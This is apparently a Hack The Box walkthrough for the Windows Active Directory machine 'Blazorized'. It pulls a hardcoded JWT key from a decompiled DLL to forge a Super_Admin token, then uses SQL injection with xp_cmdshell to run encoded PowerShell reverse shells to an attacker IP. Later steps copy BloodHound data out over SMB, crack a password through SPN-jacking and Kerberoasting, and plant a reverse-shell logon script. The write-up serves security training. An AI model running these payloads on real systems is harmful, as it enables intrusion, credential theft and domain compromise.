# Blazorized

[https://www.hackthebox.com/achievement/machine/107027/614](https://www.hackthebox.com/achievement/machine/107027/614)

<figure><img src="../../.gitbook/assets/image (847).png" alt=""><figcaption></figcaption></figure>

## Enumeration

Trying to enumerate using default timing for scanning result in long timeout errors:

```bash
nmap -v -A -O -p- -Pn blazorized.htb -oN nmap
```

To move forward, i've start nmap with -T4 option:

```bash
nmap -v -A -O -p- -T4 -Pn blazorized.htb -oN nmap
```

```bash
Nmap scan report for blazorized.htb (10.10.11.22)
Host is up (0.057s latency).
Not shown: 65507 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: Mozhar's Digital Garden
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-favicon: Unknown favicon MD5: 4ED916C575B07AD638ED9DBD55219AD5
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-07-04 14:45:07Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: blazorized.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2022 16.00.1115.00; RC0+
| ms-sql-info: 
|   10.10.11.22\BLAZORIZED: 
|     Instance name: BLAZORIZED
|     Version: 
|       name: Microsoft SQL Server 2022 RC0+
|       number: 16.00.1115.00
|       Product: Microsoft SQL Server 2022
|       Service pack level: RC0
|       Post-SP patches applied: true
|     TCP port: 1433
|_    Clustered: false
|_ssl-date: 2024-07-04T14:46:15+00:00; -10s from scanner time.
| ms-sql-ntlm-info: 
|   10.10.11.22\BLAZORIZED: 
|     Target_Name: BLAZORIZED
|     NetBIOS_Domain_Name: BLAZORIZED
|     NetBIOS_Computer_Name: DC1
|     DNS_Domain_Name: blazorized.htb
|     DNS_Computer_Name: DC1.blazorized.htb
|     DNS_Tree_Name: blazorized.htb
|_    Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 3072
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-07-04T13:07:08
| Not valid after:  2054-07-04T13:07:08
| MD5:   8b72:1b73:61f1:faa6:3f1c:af36:277e:8dd0
|_SHA-1: edbe:4cfc:440e:60db:fa13:ad07:13ed:825d:fec8:4eb2
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: blazorized.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49671/tcp open  msrpc         Microsoft Windows RPC
49672/tcp open  msrpc         Microsoft Windows RPC
49678/tcp open  msrpc         Microsoft Windows RPC
49776/tcp open  ms-sql-s      Microsoft SQL Server 2022 16.00.1115.00; RC0+
| ms-sql-ntlm-info: 
|   10.10.11.22:49776: 
|     Target_Name: BLAZORIZED
|     NetBIOS_Domain_Name: BLAZORIZED
|     NetBIOS_Computer_Name: DC1
|     DNS_Domain_Name: blazorized.htb
|     DNS_Computer_Name: DC1.blazorized.htb
|     DNS_Tree_Name: blazorized.htb
|_    Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 3072
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-07-04T13:07:08
| Not valid after:  2054-07-04T13:07:08
| MD5:   8b72:1b73:61f1:faa6:3f1c:af36:277e:8dd0
|_SHA-1: edbe:4cfc:440e:60db:fa13:ad07:13ed:825d:fec8:4eb2
|_ssl-date: 2024-07-04T14:46:15+00:00; -10s from scanner time.
| ms-sql-info: 
|   10.10.11.22:49776: 
|     Version: 
|       name: Microsoft SQL Server 2022 RC0+
|       number: 16.00.1115.00
|       Product: Microsoft SQL Server 2022
|       Service pack level: RC0
|       Post-SP patches applied: true
|_    TCP port: 49776
49806/tcp open  msrpc         Microsoft Windows RPC
53252/tcp open  msrpc         Microsoft Windows RPC
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=7/4%OT=53%CT=1%CU=31518%PV=Y%DS=2%DC=T%G=Y%TM=6686B
OS:5C2%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10B%TI=I%CI=I%II=I%SS=S%T
OS:S=U)OPS(O1=M53CNW8NNS%O2=M53CNW8NNS%O3=M53CNW8%O4=M53CNW8NNS%O5=M53CNW8N
OS:NS%O6=M53CNNS)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)ECN(R=
OS:Y%DF=Y%T=80%W=FFFF%O=M53CNW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%R
OS:D=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=0
OS:%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(
OS:R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%
OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N
OS:%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%C
OS:D=Z)

Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=260 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: Host: DC1; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: -9s, deviation: 0s, median: -9s
| smb2-time: 
|   date: 2024-07-04T14:46:07
|_  start_date: N/A

TRACEROUTE (using port 21/tcp)
HOP RTT      ADDRESS
1   55.51 ms 10.10.14.1
2   55.69 ms blazorized.htb (10.10.11.22)

NSE: Script Post-scanning.
Initiating NSE at 16:46
Completed NSE at 16:46, 0.00s elapsed
Initiating NSE at 16:46
Completed NSE at 16:46, 0.00s elapsed
Initiating NSE at 16:46
Completed NSE at 16:46, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 129.17 seconds
           Raw packets sent: 67625 (2.979MB) | Rcvd: 66118 (2.649MB)
```

### Port 80

<figure><img src="../../.gitbook/assets/image (848).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (849).png" alt=""><figcaption></figcaption></figure>

There is a section called "Check for Updates" that seems to be very interesting because interact with some API as administrator user:

<figure><img src="../../.gitbook/assets/image (850).png" alt=""><figcaption></figcaption></figure>

Also there is a "Markdown Playground":

<figure><img src="../../.gitbook/assets/image (851).png" alt=""><figcaption></figcaption></figure>

The section "Interesting Digital Gardens" and "Misc.Links" show us an API interaction error:

<figure><img src="../../.gitbook/assets/image (852).png" alt=""><figcaption></figcaption></figure>

Trying to fuzz subdomain using `gobuster` we will obtain an interesting result:

{% code overflow="wrap" %}
```bash
gobuster vhost -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://blazorized.htb --append-domain 
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (854).png" alt=""><figcaption></figcaption></figure>

`admin.blazorized.htb` requires credentials to login:

<figure><img src="../../.gitbook/assets/image (853).png" alt=""><figcaption></figcaption></figure>

The backend makes some query to internal API about categories when we hit the Check for Updates button:

<figure><img src="../../.gitbook/assets/image (855).png" alt=""><figcaption></figcaption></figure>

It's a Blazor WASM webapp, so analyzing the \_framework/blazor.boot.json we can find metadata about application such as DLLs used:

<figure><img src="../../.gitbook/assets/image (38).png" alt=""><figcaption></figcaption></figure>

These seem from the name to be the most interesting ones:ut

<figure><img src="../../.gitbook/assets/image (39).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (40).png" alt=""><figcaption></figcaption></figure>

In particular the last one:

<figure><img src="../../.gitbook/assets/image (42).png" alt=""><figcaption></figcaption></figure>

If we copy the HTTP request of Blazorized.Helpers.dll and paste in another tab, we will start the DLL download and we can disassembly it using `ildasm.exe` on a Windows machine with Visual Studio installed:

<figure><img src="../../.gitbook/assets/image (43).png" alt=""><figcaption></figcaption></figure>

Revealing some hardcoded secrets in `Blazorized.Helpers.dll`:

<figure><img src="../../.gitbook/assets/image (44).png" alt=""><figcaption></figcaption></figure>

```
  IL_0000:  ldstr      "8697800004ee25fc33436978ab6e2ed6ee1a97da699a53a53d"
  + "96cc4d08519e185d14727ca18728bf1efcde454eea6f65b8d466a4fb6550d5c795d9d91"
  + "76ea6cf021ef9fa21ffc25ac40ed80f4a4473fc1ed10e69eaf957cfc4c67057e547fadf"
  + "ca95697242a2ffb21461e7f554caa4ab7db07d2d897e7dfbe2c0abbaf27f215c0ac5174"
  + "2c7fd58c3cbb89e55ebb4d96c8ab4234f2328e43e095c0f55f79704c49f07d5890236fe"
  + "6b4fb50dcd770e0936a183d36e4d544dd4e9a40f5ccf6d471bc7f2e53376893ee7c699f"
  + "48ef392b382839a845394b6b93a5179d33db24a2963f4ab0722c9bb15d361a34350a002"
  + "de648f13ad8620750495bff687aa6e2f298429d6c12371be19b0daa77d40214cd6598f5"
  + "95712a952c20eddaae76a28d89fb15fa7c677d336e44e9642634f32a0127a5bee80838f"
  + "435f163ee9b61a67e9fb2f178a0c7c96f160687e7626497115777b80b7b8133cef9a661"
  + "892c1682ea2f67dd8f8993c87c8c9c32e093d2ade80464097e6e2d8cf1ff32bdbcd3dfd"
  + "24ec4134fef2c544c75d5830285f55a34a525c7fad4b4fe8d2f11af289a1003a7034070"
  + "c487a18602421988b74cc40eed4ee3d4c1bb747ae922c0b49fa770ff510726a4ea3ed5f"
  + "8bf0b8f5e1684fb1bccb6494ea6cc2d73267f6517d2090af74ceded8c1cd32f3617f0da"
  + "00bf1959d248e48912b26c3f574a1912ef1fcc2e77a28b53d0a"
  IL_0005:  stsfld     string Blazorized.Helpers.JWT::jwtSymmetricSecurityKey
  IL_000a:  ldstr      "superadmin@blazorized.htb"
  IL_000f:  stsfld     string Blazorized.Helpers.JWT::superAdminEmailClaimValue
  IL_0014:  ldstr      "Posts_Get_All"
  IL_0019:  stsfld     string Blazorized.Helpers.JWT::postsPermissionsClaimValue
  IL_001e:  ldstr      "Categories_Get_All"
  IL_0023:  stsfld     string Blazorized.Helpers.JWT::categoriesPermissionsClaimValue
  IL_0028:  ldstr      "Super_Admin"
  IL_002d:  stsfld     string Blazorized.Helpers.JWT::superAdminRoleClaimValue
  IL_0032:  ldstr      "http://api.blazorized.htb"
  IL_0037:  stsfld     string Blazorized.Helpers.JWT::issuer
  IL_003c:  ldstr      "http://api.blazorized.htb"
  IL_0041:  stsfld     string Blazorized.Helpers.JWT::apiAudience
  IL_0046:  ldstr      "http://admin.blazorized.htb"
  IL_004b:  stsfld     string Blazorized.Helpers.JWT::adminDashboardAudience
```

Extracted informations are these one:

* jwtSymmetricSecurityKey:️`8697800004ee25fc33436978ab6e2ed6ee1a97da699a53a53d96cc4d08519e185d14727ca18728bf1efcde454eea6f65b8d466a4fb6550d5c795d9d9176ea6cf021ef9fa21ffc25ac40ed80f4a4473fc1ed10e69eaf957cfc4c67057e547fadfca95697242a2ffb21461e7f554caa4ab7db07d2d897e7dfbe2c0abbaf27f215c0ac51742c7fd58c3cbb89e55ebb4d96c8ab4234f2328e43e095c0f55f79704c49f07d5890236fe6b4fb50dcd770e0936a183d36e4d544dd4e9a40f5ccf6d471bc7f2e53376893ee7c699f48ef392b382839a845394b6b93a5179d33db24a2963f4ab0722c9bb15d361a34350a002de648f13ad8620750495bff687aa6e2f298429d6c12371be19b0daa77d40214cd6598f595712a952c20eddaae76a28d89fb15fa7c677d336e44e9642634f32a0127a5bee80838f435f163ee9b61a67e9fb2f178a0c7c96f160687e7626497115777b80b7b8133cef9a661892c1682ea2f67dd8f8993c87c8c9c32e093d2ade80464097e6e2d8cf1ff32bdbcd3dfd24ec4134fef2c544c75d5830285f55a34a525c7fad4b4fe8d2f11af289a1003a7034070c487a18602421988b74cc40eed4ee3d4c1bb747ae922c0b49fa770ff510726a4ea3ed5f8bf0b8f5e1684fb1bccb6494ea6cc2d73267f6517d2090af74ceded8c1cd32f3617f0da00bf1959d248e48912b26c3f574a1912ef1fcc2e77a28b53d0a`
* superAdminEmailClaimValue: `superadmin@blazorized.htb`
* postsPermissionsClaimValue: `Posts_Get_All`
* categoriesPermissionsClaimValue: `Categories_Get_All`
* superAdminRoleClaimValue: `Super_Admin`
* issuer: `http://api.blazorized.htb`
* apiAudience: `http://api.blazorized.htb`
* adminDashboardAudience: `http://admin.blazorized.htb`

Now forge using these information a JWT for Super Admin on [Jwt Builder](http://jwtbuilder.jamiekurtz.com/):

{% code overflow="wrap" %}
```
{
    "iss": "http://api.blazorized.htb",
    "iat": 1720023041,
    "exp": 1751559042,
    "aud": "http://api.blazorized.htb",
    "sub": "superadmin@blazorized.htb",
    "http://schemas.xmlsoap.org/ws/2005/05/identity/claims/emailaddress": "superadmin@blazorized.htb",
    "http://schemas.microsoft.com/ws/2008/06/identity/claims/role": "Super_Admin"
}
```
{% endcode %}

But we still lack to know which signing algorithm is used by the backend:

<figure><img src="../../.gitbook/assets/image (856).png" alt=""><figcaption></figcaption></figure>

We can easily identify it by deassembling the JWT class and looking at its code where valid algorithms are listed:

<figure><img src="../../.gitbook/assets/image (857).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
Note how in this screenshot to make it easier to read the code the [dnSpy](https://github.com/dnSpy/dnSpy) tool was used.
{% endhint %}

Now finally set up the JWT under Local storage as shown in the picture and refresh to access successfully the admin dashboard:

{% code overflow="wrap" %}
```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJpc3MiOiJodHRwOi8vYXBpLmJsYXpvcml6ZWQuaHRiIiwiaWF0IjoxNzIwMDIzMDQxLCJleHAiOjE3ODMwOTUwNDIsImF1ZCI6Imh0dHA6Ly9hcGkuYmxhem9yaXplZC5odGIiLCJzdWIiOiJzdXBlcmFkbWluQGJsYXpvcml6ZWQuaHRiIiwiaHR0cDovL3NjaGVtYXMueG1sc29hcC5vcmcvd3MvMjAwNS8wNS9pZGVudGl0eS9jbGFpbXMvZW1haWxhZGRyZXNzIjoic3VwZXJhZG1pbkBibGF6b3JpemVkLmh0YiIsImh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd3MvMjAwOC8wNi9pZGVudGl0eS9jbGFpbXMvcm9sZSI6IlN1cGVyX0FkbWluIn0.rJlfRPSWEOS5cZ5NQQZd1W8UUDUArPbyeBLHEu7VLQDAvCxcz3GUEZ8mMaHXsCKXIpHpIXqpQCDix2XC58vfGA
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (858).png" alt=""><figcaption></figcaption></figure>

On the home page of the admin control panel we find an interesting clue regarding the operation and communication of the application with the backend. From the scan performed earlier we know that there is an MSSQL Server 2022:

<figure><img src="../../.gitbook/assets/image (32).png" alt=""><figcaption></figcaption></figure>

### Port 1433

<figure><img src="../../.gitbook/assets/image (33).png" alt=""><figcaption></figcaption></figure>

This functionality probably set the MSSQL raw query in this way:

```
SELECT post_title
FROM posts
WHERE post_title = 'pippo';
```

To inject some SQL code we need to truncate the query and insert the code to enable xp\_cmdshell:

{% code overflow="wrap" %}
```sql
pippo'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;-- -
```
{% endcode %}

And run the encoded powershell command to obtain a reverse shell:

{% code overflow="wrap" %}
```sql
pippo'; exec master..xp_cmdshell 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4ANAA3ACIALAA1ADUANQA1ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==';-- -
```
{% endcode %}

we will obtain a reverse shell as `NU_1055` and we can get the user flag :tada:

<figure><img src="../../.gitbook/assets/image (859).png" alt=""><figcaption></figcaption></figure>

Download on victim machine SharpHound because we don't have any credentials to run remotely the AD collection tools like BloodHound or SharpHound:

{% hint style="danger" %}
I've used the v1.1.0 of SharpHound due to incompatibility errors during uploading JSON in BloodHound\
[https://github.com/BloodHoundAD/BloodHound/issues/702](https://github.com/BloodHoundAD/BloodHound/issues/702)
{% endhint %}

```powershell
./sh.exe --CollectionMethods All
```

<figure><img src="../../.gitbook/assets/image (860).png" alt=""><figcaption></figcaption></figure>

Now to grab on Kali machine this ZIP file we can use SMB to upload it from reverse shell to a SMB share started using impacket.

On Kali machine start a SMB server creating a share called SHARE inside a directory:

```bash
smbserver.py -smb2support -user test -password test SHARE `pwd`
```

<figure><img src="../../.gitbook/assets/image (861).png" alt=""><figcaption></figcaption></figure>

From Windows create username, password and then credential variable. Define also the source path to file to exfiltrate:

{% code overflow="wrap" %}
```powershell
$username = "test"
$password = "test"
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential($username, $securePassword)
$sourcePath = "C:\temp\20240705051814_BloodHound.zip"
```
{% endcode %}

Map remote SMB share to a local drive:

```powershell
net use z: \\10.10.14.206\SHARE /user:test test
```

<figure><img src="../../.gitbook/assets/image (862).png" alt=""><figcaption></figcaption></figure>

Finally copy the zip to SMB share:

```powershell
copy-item -path $sourcepath -destination z:
```

<figure><img src="../../.gitbook/assets/image (863).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (864).png" alt=""><figcaption></figcaption></figure>

Now unzip and import these JSONs in BloodHound:

<figure><img src="../../.gitbook/assets/image (865).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (866).png" alt=""><figcaption></figcaption></figure>

Mark user `NU_1055` as Owned and find some juicy privesc path:

<figure><img src="../../.gitbook/assets/image (867).png" alt=""><figcaption></figcaption></figure>

From BloodHound we can see that `RSA_4810`, a user seen previously also under `C:\Users` directory, can be  a Kerberoastable user:

<figure><img src="../../.gitbook/assets/image (869).png" alt=""><figcaption></figcaption></figure>

If we analyze the correlation between two users, setting `NU_1055` as starting point and `RSA_4810` as ending node, we will find that `NU_1055` has WriteSPN on `RSA_4810`:

<figure><img src="../../.gitbook/assets/image (870).png" alt=""><figcaption></figcaption></figure>

To exploit this we use SPN-jacking attack and we need to upload PowerView.ps1.

Set SPN and request a service ticket:

```powershell
Set-DomainObject -Identity RSA_4810 -SET @{serviceprincipalname='pippo/pluto'}
```

```powershell
Get-DomainSPNTicket -SPN pippo/pluto
```

<figure><img src="../../.gitbook/assets/image (873).png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```
$krb5tgs$23$*UNKNOWN$UNKNOWN$pippo/pluto*$E986F2A6AE80DEB56C07080BA809FC3C$09BF69B56C64AAF35AF73BBAE06BFA076FD2232FF89DCCC0CA801878B31ED80413B6346BFE9E2BC15FD1C066308375F78299477A9834F373935501306166E8A0CD8DCB63F26F82EDC826598B2A59DCDC0C5377751BECF3C65627F888C4D6D7241B972DD2603A9BB77B8F21F5A36143C29C1B636702FD37D9C250E65846F70627D750218832F4AD797A335691A1E3C78A947E98EE5AA306683E1686F04C8FA0573412C074D7063BF71985F3C171D19002C1AFFCAA08E47911988149F2DFD79D48D695262D49D3BECB1503FE59437DC1F29945CEE235C26EEB789BD84E1DBABC545A1CD8E2FCDA79DED85A25FF128C8F7481857076D86A57277B2D6E797F25F87DE81ECDA4BE1026544CB2DBB47DC805991D10537475AE60722B577DEE6BF697212DC10181E5E90426741F9F45472A8F2627EDA3F0745FA621FDA9193E038D7FF3EA122CCA021BC95AB3A91CB065CF72EFF731183FF545A5C2C87BE0AD479DF9EB559D9FEA4E6331D8948ED3D171E20630C405C394435DE04CA08B5A3A624B2873CE026362ADFE522DBB640F8C8C5834A02B7AEA79AA86ED0A7803AA1E530E88E120C324748559016AA58B68A81A19969C5FAA69477FFBECAEBCE17B6D0035997B705A707BC8C0D0CC92C80680A5E9865280FB4ED494AB5171560018B94AB0068912E361FEF4C5BBC093B3F821088271D5B18CFD657DC748020E4E0C6B2DEA87BD962A59641C69F580F3B2C8AD81056A845AB2F3CCCAE529BA019A49182883DD2DE3A12E52B6FEAAFD8FCE9F38A0AB8225713B77EE94858D6D3BA61AEFE706284B879165D614BA0562701B91709B65DF2934280BD6E6407BC8523B8087F96168FB6E609FCF82354ABBC4D138AF5129C29509CAF98588434D040F185F3FB976EB022025F7476B1F5E9D41FBA973D2D199E149E2871C72893E0FC153D66FCAF2E176E737750C275B2B21824D18B72FF1B488F26464CCAC0B112B9CA4624C4C7B834941E61BF9533D8D765AE02DFD44FE6E9B1245F771D6DB4BC92012877B0AADD38BB3267AEDF3484B4150D78CB884A5F8BE653B1ED9F2A49EE08D7412C62575BBFB451AC05582C41BB8CDA73DE65C6EA821867E6FFC70295E9E0D22FBCC0F591BA0F207CE21EBCB62AC3F9BBA8244CC6C6133A30EDD2C1A9A181103D0CD0597DECDDB5B2C07E5D472912EF86AC31D12A0EC8ED05A8D57D19F385488789131C73DEE952FAE77B06C95B7FE946D510D52F2E55B117D7A44C18BAF9DC9145EA14377FE80818EA306A08D3EFE9C80A3A82E5CB90602A9B9B5146B82B82704BE3E8D0F2233CD2FC909D7C683F55B3EE840E8DDEC6B3595D3CF14420E2C43E7066749572E1C796255340158F6D4D7306343245A8DAD5D1C1F8DA6B1E473C645C90BCFF4372A6E18944FBCA82CFA476C9FE241E78F3285F6FB404B724988B65B57D566808E3DB6527263D7F1F7D95892B1D3841EBA247B10447E5A31F4B9B6E4BA350453C539A8AC6DD708EA8E1910C54D2676CA81F61DF28A58FAD8CFD4221E8B3FDC224D9E796966979E866663E3C0978FB1B6B45509625D21019EB227E326226C1BA229C89A7278476A99F08E5E36CB05D2692AD44A0E77C5EC04A3B69731131273698701C5A0F67D88843677A6BCF09519A0E4811FFF287E2AFB0DA7A63F842D49E5BA9E99C3B593BB89111B0D2BF39B664567FAB29DB98348FB999F4AD8C0D37843208A023F6B6B663680B12EEA56C30F24D0987CEE594FB42B4BFB68586A457666213A0B4C4D74E78519
```
{% endcode %}

we got the TGS ticket, save it in a file and use John The Ripper to brute force it:

{% code overflow="wrap" %}
```bash
john --wordlist=/usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt hash.txt
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (874).png" alt=""><figcaption></figcaption></figure>

Username: `RSA_4810`

Password: `(Ni7856Do9854Ki05Ng0005 #)`

Finally we can use `evil-winrm` to login as `RSA_4810` user:

```bash
evil-winrm -u 'RSA_4810' -p '(Ni7856Do9854Ki05Ng0005 #)' -i blazorized.htb
```

## Privilege Escalation (SSA\_6010)

Restart the enumeration phase using on victim machine SharpHound and exfiltrate using SMB server the ZIP containing all the JSON files. Using BloodHound we didn't find any interesting infos. Try to use PowerView:

<figure><img src="../../.gitbook/assets/image (25).png" alt=""><figcaption></figcaption></figure>

we can see that `RSA_4810` can change script-path of `SSA_6010` so as RSA\_4810 we can add a reverse shell script to a writable directory and set it as a script path for the user SSA\_6010:

<figure><img src="../../.gitbook/assets/image (24).png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```powershell
echo "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4ANAA3ACIALAA2ADcAOAA5ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==" | Out-File -FilePath C:\windows\SYSVOL\sysvol\blazorized.htb\scripts\A32FF3AEAA23\login.bat -Encoding ASCII
```
{% endcode %}

Set the ScriptPath for `SSA_6010`:

```
Set-ADUser -Identity SSA_6010 -ScriptPath 'A32FF3AEAA23\login.bat'
```

